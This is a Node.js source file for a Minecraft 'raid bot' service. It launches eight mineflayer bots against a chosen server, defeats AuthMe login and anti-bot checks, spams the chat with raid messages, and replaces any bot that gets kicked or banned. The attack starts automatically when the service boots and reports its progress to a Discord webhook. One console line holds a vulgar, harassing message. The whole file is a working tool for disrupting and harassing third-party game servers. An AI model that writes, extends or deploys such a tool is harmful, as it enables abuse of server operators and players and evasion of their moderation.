const express = require('express');
const mineflayer = require('mineflayer');

// Render Web Service Uptime
const app = express();
const PORT = process.env.PORT || 8080;

app.get('/', (req, res) => {
    res.send('Minecraft Raid Bot Service is Active & Running!');
});

app.listen(PORT, () => {
    console.log(`[+] Web server listening on port ${PORT}`);
});

// ---------------- ENVIRONMENT CONFIGURATION ----------------
const SERVER_IP = process.env.SERVER_IP || '127.0.0.1';
const SERVER_PORT = parseInt(process.env.SERVER_PORT || '25565');
const PASSWORD = process.env.BOT_PASSWORD || 'RaidPass123';
const BASE_BOT_NAME = process.env.BOT_NAME || 'RaidBot';
const WEBHOOK_URL = process.env.WEBHOOK_URL || ''; // Discord Webhook URL

const TOTAL_BOTS = 8;
const MESSAGE_LIMIT = 50;
const MESSAGE_INTERVAL = 3000;
const COOLDOWN_TIME = 5 * 60 * 1000;

let activeBots = [];
let isRunning = true; // Auto-start on boot

// Discord Webhook par logs bhejne ka function
async function sendWebhook(title, description, color = 3447003) {
    if (!WEBHOOK_URL) {
        console.error('[-] ERROR: WEBHOOK_URL environment variable set nahi hai!');
        return;
    }

    try {
        const response = await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: title,
                    description: description,
                    color: color,
                    timestamp: new Date().toISOString()
                }]
            })
        });

        if (!response.ok) {
            console.error(`[-] Webhook Error: Server responded with status ${response.status}`);
        }
    } catch (error) {
        console.error('[-] Webhook Failed to Send:', error.message);
    }
}

// Ek single bot ko create karne aur auto-replace handle karne ka function
function spawnSingleBot() {
    if (!isRunning) return;

    const username = `${BASE_BOT_NAME}_${Math.floor(Math.random() * 9000 + 1000)}`;
    
    const bot = mineflayer.createBot({
        host: SERVER_IP,
        port: SERVER_PORT,
        username: username,
        auth: 'offline',
        brand: 'vanilla'
    });

    activeBots.push(bot);

    bot.on('spawn', () => {
        const successMsg = `[+] Bot **${username}** successfully server par join ho gaya hai!`;
        console.log(successMsg);
        sendWebhook('🟢 Bot Connected', successMsg, 3066993); // Green color

        // AuthMe / Login Plugin Bypass
        setTimeout(() => {
            if (!isRunning) return;
            bot.chat(`/register ${PASSWORD} ${PASSWORD}`);
            setTimeout(() => {
                if (!isRunning) return;
                bot.chat(`/login ${PASSWORD}`);
            }, 2000);
        }, 3000);

        // Anti-Bot bypass movement (5s walk/jump -> 3s stop)
        function startMovement() {
            if (!isRunning) return;
            bot.setControlState('forward', true);
            bot.setControlState('jump', Math.random() > 0.5);
            const randomYaw = Math.random() * Math.PI * 2;
            bot.look(randomYaw, 0, true);

            setTimeout(() => {
                if (!isRunning) return;
                bot.setControlState('forward', false);
                bot.setControlState('jump', false);

                setTimeout(() => {
                    startMovement();
                }, 3000);
            }, 5000);
        }

        setTimeout(startMovement, 4000);

        // Chat Spamming Logic (50 messages per bot -> 5m cooldown)
        let messageCount = 0;
        const spamInterval = setInterval(() => {
            if (!isRunning) {
                clearInterval(spamInterval);
                return;
            }

            if (messageCount >= MESSAGE_LIMIT) {
                const limitMsg = `[*] Bot **${username}** ne 50 messages bhej diye hain. 5 min cooldown shuru...`;
                console.log(limitMsg);
                sendWebhook('⏳ Cooldown Active', limitMsg, 16776960); // Yellow color
                clearInterval(spamInterval);
                
                setTimeout(() => {
                    if (isRunning) {
                        messageCount = 0;
                    }
                }, COOLDOWN_TIME);
                return;
            }

            bot.chat('DDOS RAIDED BY UNKNOW');
            messageCount++;
            
            // Real-time chat log webhook par bhejna (Optional: har message par spam rokne ke liye console par rakha hai, chahe toh webhook on kar sakte hain)
            console.log(`[💬] (${username}) Message sent: DDOS FUKCED AND UR SISTER BY SPYER (${messageCount}/${MESSAGE_LIMIT})`);
        }, MESSAGE_INTERVAL);

        bot.on('end', () => {
            clearInterval(spamInterval);
        });
    });

    bot.on('kicked', (reason) => {
        const kickMsg = `[-] Bot **${username}** kick/ban ho gaya! Reason: ${reason}`;
        console.log(kickMsg);
        sendWebhook('🔴 Bot Kicked / Banned', kickMsg, 15158332); // Red color
        cleanupAndReplace(bot);
    });

    bot.on('error', (err) => {
        const errorMsg = `[-] Bot **${username}** Error: ${err.message}`;
        console.log(errorMsg);
        sendWebhook('⚠️ Bot Error', errorMsg, 15158332);
        cleanupAndReplace(bot);
    });
}

// Agar koi bot kick/disconnect ho, toh use list se hata kar turant naya bot le aana
function cleanupAndReplace(botInstance) {
    const idx = activeBots.indexOf(botInstance);
    if (idx !== -1) {
        activeBots.splice(idx, 1);
    }

    if (isRunning) {
        console.log(`[!] Jagah khali ho gayi hai. 3 seconds mein naya random bot spawn ho raha hai...`);
        setTimeout(() => {
            if (isRunning) {
                spawnSingleBot();
            }
        }, 3000);
    }
}

// Auto-start Raid on Boot
function startRaidBots() {
    console.log(`[*] ${TOTAL_BOTS} bots ko auto-spawn karne ka process shuru kiya ja raha hai...`);
    sendWebhook('🚀 Raid Started', `Auto-started launching ${TOTAL_BOTS} raid bots to target: \`${SERVER_IP}:${SERVER_PORT}\``, 3447003);

    for (let i = 0; i < TOTAL_BOTS; i++) {
        setTimeout(() => {
            if (!isRunning) return;
            spawnSingleBot();
        }, i * 2000); // 2 seconds gap
    }
}

// Program start hote hi raid chalu
setTimeout(() => {
    startRaidBots();
}, 2000);
